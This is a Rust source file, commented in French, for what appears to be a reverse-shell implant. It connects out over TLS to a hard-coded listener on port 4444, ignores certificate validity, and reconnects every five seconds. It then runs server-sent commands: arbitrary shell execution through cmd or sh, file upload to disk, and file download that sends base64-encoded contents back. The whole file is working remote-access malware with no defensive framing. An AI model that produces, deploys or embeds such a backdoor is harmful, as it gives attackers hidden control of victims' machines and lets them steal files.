use std::io::{Write, BufRead, BufReader};
use std::net::TcpStream;
use std::process::Command;
use std::path::Path;
use std::{env, fs};
use native_tls::TlsConnector;
use base64::{Engine as _, engine::general_purpose};

const SERVER_IP: &str = "127.0.0.1";
const SERVER_PORT: &str = "4444";

fn main() {
    let connector = match TlsConnector::builder()
        .danger_accept_invalid_certs(true) 
        .build() 
    {
        Ok(c) => c,
        Err(_) => return, 
    };

    loop {
        match TcpStream::connect(format!("{}:{}", SERVER_IP, SERVER_PORT)) {
            Ok(stream) => {
                match connector.connect(SERVER_IP, stream) {
                    Ok(stream) => {
                        let mut reader = BufReader::new(stream);
                        let mut buffer = String::new();

                        loop {
                            buffer.clear();
                            match reader.read_line(&mut buffer) {
                                Ok(n) => {
                                    if n == 0 { break; }
                                    
                                    let cmd_line = buffer.trim().to_string();
                                
                                    let output_stream = reader.get_mut();
                                    
                                    process_command(cmd_line, output_stream);
                                }
                                Err(_) => break, 
                            }
                        }
                    },
                    Err(_) => {
                        // Echec handshake
                    }
                }
            },
            Err(_) => {
                // Serveur injoignable
            }
        }

        // Attente avant reconnexion (5s)
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}

fn process_command(cmd_line: String, stream: &mut native_tls::TlsStream<TcpStream>) {
    let parts: Vec<&str> = cmd_line.split_whitespace().collect();
    if parts.is_empty() { return; }

    let command = parts[0];
    let args = &parts[1..];

    match command {
        "cd" => {
            let new_dir = if args.is_empty() { "/" } else { args[0] };
            let root = Path::new(new_dir);
            let msg = match env::set_current_dir(&root) {
                Ok(_) => "Repertoire change.".to_string(),
                Err(e) => format!("Erreur CD: {}", e),
            };
            send_response(stream, msg);
        },
        "upload" => {
            // Syntaxe reçue: upload <BASE64> <NOM>
            if args.len() >= 2 {
                let b64_data = args[0];
                let filename = args[1];

                let msg = match general_purpose::STANDARD.decode(b64_data) {
                    Ok(bytes) => {
                        match fs::write(filename, bytes) {
                            Ok(_) => "Succes: Fichier uploade.".to_string(),
                            Err(e) => format!("Erreur écriture disque: {}", e),
                        }
                    },
                    Err(e) => format!("Erreur décodage Base64: {}", e),
                };
                send_response(stream, msg);
            } else {
                send_response(stream, "Erreur protocole upload.".to_string());
            }
        },
        "download" => {
            // Syntaxe reçue: download <NOM>
            if let Some(filename) = args.get(0) {
                match fs::read(filename) {
                    Ok(data) => {
                        // Encodage du fichier + Envoi
                        let b64 = general_purpose::STANDARD.encode(&data);
                        // On utilise write_all direct ici
                        let _ = stream.write_all(format!("{}\n", b64).as_bytes());
                        let _ = stream.flush();
                    },
                    Err(e) => {
                        // Envoi de l'erreur (encodée en Base64 pour que le serveur la lise proprement)
                        let error_msg = format!("ERROR: Impossible de lire '{}': {}", filename, e);
                        send_response(stream, error_msg);
                    }
                }
            }
        },
        "exit" => {
            // On essaie d'envoyer un dernier message, puis on quitte
            let _ = stream.write_all(b"Au revoir.\n"); 
            std::process::exit(0);
        },
        _ => {
            execute_os_command(command, args, stream);
        }
    }
}

// Helper pour encoder en Base64 et envoyer avec \n
fn send_response(stream: &mut native_tls::TlsStream<TcpStream>, msg: String) {
    let b64 = general_purpose::STANDARD.encode(msg);
    let _ = stream.write_all(format!("{}\n", b64).as_bytes());
}

fn execute_os_command(cmd: &str, args: &[&str], stream: &mut native_tls::TlsStream<TcpStream>) {
    let mut full_cmd = cmd.to_string();
    for arg in args {
        full_cmd.push(' ');
        full_cmd.push_str(arg);
    }

    #[cfg(target_os = "windows")]
    let (shell, flag) = ("cmd", "/C");

    #[cfg(not(target_os = "windows"))]
    let (shell, flag) = ("sh", "-c");

    match Command::new(shell).args(&[flag, &full_cmd]).output() {
        Ok(output) => {
            let mut response_bytes = output.stdout;
            // On ajoute stderr si présent
            if !output.stderr.is_empty() {
                response_bytes.extend_from_slice(b"\n--- STDERR ---\n");
                response_bytes.extend(output.stderr);
            }

            // Encodage Base64 pour éviter problèmes d'accents/multilignes
            let b64_response = general_purpose::STANDARD.encode(&response_bytes);
            let _ = stream.write_all(format!("{}\n", b64_response).as_bytes());
        },
        Err(e) => {
            let error_msg = format!("Impossible d'exécuter: {}", e);
            send_response(stream, error_msg);
        }
    }
}